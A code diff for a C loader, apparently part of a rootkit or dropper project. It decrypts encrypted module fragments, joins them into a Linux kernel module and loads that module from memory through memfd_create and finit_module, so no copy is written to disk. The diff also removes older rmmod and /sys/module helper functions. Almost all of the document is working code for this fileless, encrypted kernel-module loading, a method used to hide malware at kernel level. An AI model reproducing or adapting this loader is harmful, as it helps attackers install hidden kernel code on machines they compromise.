@@ -1,109 +1,87 @@
 #include "../include/load.h"
 #include "../include/cipher.h"
+#define _GNU_SOURCE
+#include <linux/memfd.h>
+#include <linux/module.h>
+#include <stdio.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <unistd.h>
 
-int remove_lkm(){
+#include <stdlib.h>
+#include <string.h>
 
-  char command[10] = "rmmod lkm";
+uint8_t *decrypt_lkm(fraction_t *fractions, int fractions_count, ssize_t *len) {
 
-  int result = system(command);
-  if(result == -1){
-    log_error("Error executing rmmod");
-    return -1;
-  }
-  return WEXITSTATUS(result);
-}
-
-int is_lkm_loaded(const char* name){
-
-  DIR *dir = opendir("/sys/module/");
-
-  if(!dir){
-    log_error("Error opening the /sys/module directory");
-    return -1;
-  }
-
-  struct dirent *entry;
-
-  while ((entry = readdir(dir)) != NULL){
-    if(strcmp(entry->d_name, name) == 0){
-       closedir(dir);
-       puts("Module already loaded!");
-       return 1;
-    }
-  }
-
-  closedir(dir);
-  return 0;
-
-}
-
-int load_lkm(const unsigned char *lkm,ssize_t total_size){
-
-    int fdlkm = memfd_create("lkmmod", 0);
-    if (fdlkm < 0) {
-      log_error("memfd_create failed");
-      return -1;
-  }
-   ssize_t written_bytes = write(fdlkm, lkm, total_size);
-    if (written_bytes < 0) {
-      log_error("Error writing to memfd");
-      close(fdlkm);
-      return -1;
-    } else if (written_bytes != total_size) {
-      log_error("Incomplete write to memfd (Expected %zu, wrote %zd)\n)", total_size, written_bytes);
-      close(fdlkm);
-      return -1;
-    }
-    if (syscall(SYS_finit_module, fdlkm, "", 0) != 0) {
-      log_error("Failed to init module");
-      close(fdlkm);
-      return -1;
-    }
-
-  printf("Module loaded successfully\n");
-  close(fdlkm);
-
-  return 0;
-}
-
-int create_lkm(int num_links,fraction_t *fractions){
-
-  unsigned char *module = NULL;
+  uint8_t *module = NULL;
   ssize_t total_size = 0;
   ssize_t module_size = 0;
-  decrypted *decrstr;
+  decrypted_t *decr;
 
-  for (int i = 0; i < num_links; i++) {
-
-    decrstr = decrypt_fraction( &fractions[i]);
-    if (decrstr -> decryptedtext == NULL) {
+  for (int i = 0; i < fractions_count; i++) {
+    decr = decrypt_fraction(&fractions[i]);
+    if (decr == NULL) {
       log_error("Decryption process failed");
-      return -1;
+      return NULL;
     }
+
     if (module == NULL) {
-      total_size = decrstr -> text_size;
+      total_size = decr->text_size;
       module = malloc(total_size);
       if (module == NULL) {
         log_error("Error in memory assigning");
-        return -1;
+        decrypted_free(decr);
+        return NULL;
       }
-    } else if (module_size + decrstr -> text_size > total_size) {
-      total_size += decrstr -> text_size;
-      unsigned char * tmp = realloc(module, total_size);
+    } else {
+      total_size += decr->text_size;
+      uint8_t *tmp = realloc(module, total_size);
       if (tmp == NULL) {
         log_error("Memory reallocation failed");
-        return -1;
+        free(module);
+        decrypted_free(decr);
+        return NULL;
       }
       module = tmp;
     }
-    memcpy(module + module_size, decrstr -> decryptedtext, decrstr -> text_size);
-    module_size += decrstr -> text_size;
+    memcpy(module + module_size, decr->decrypted_text, decr->text_size);
+    module_size += decr->text_size;
+
+    decrypted_free(decr);
   }
 
-  if(load_lkm(module, total_size) < 0){
-    log_error("There was an error loading the LKM");
+  *len = module_size;
+  return module;
+}
+
+int load_lkm(const uint8_t *lkm, ssize_t total_size) {
+
+  int fdlkm = syscall(SYS_memfd_create, "lkmmod", 0);
+  if (fdlkm < 0) {
+    log_error("memfd_create failed");
+    return -1;
   }
 
+  ssize_t written_bytes = write(fdlkm, lkm, total_size);
+  if (written_bytes < 0) {
+    log_error("Error writing to memfd");
+    close(fdlkm);
+    return -1;
+  } else if (written_bytes != total_size) {
+    log_error("Incomplete write to memfd (Expected %zu, wrote %zd)",
+              total_size, written_bytes);
+    close(fdlkm);
+    return -1;
+  }
+
+  if (syscall(SYS_finit_module, fdlkm, "", 0) != 0) {
+    log_error("Failed to init module");
+    close(fdlkm);
+    return -1;
+  }
+
+  log_debug("Module loaded successfully");
+  close(fdlkm);
 
   return 0;
 }
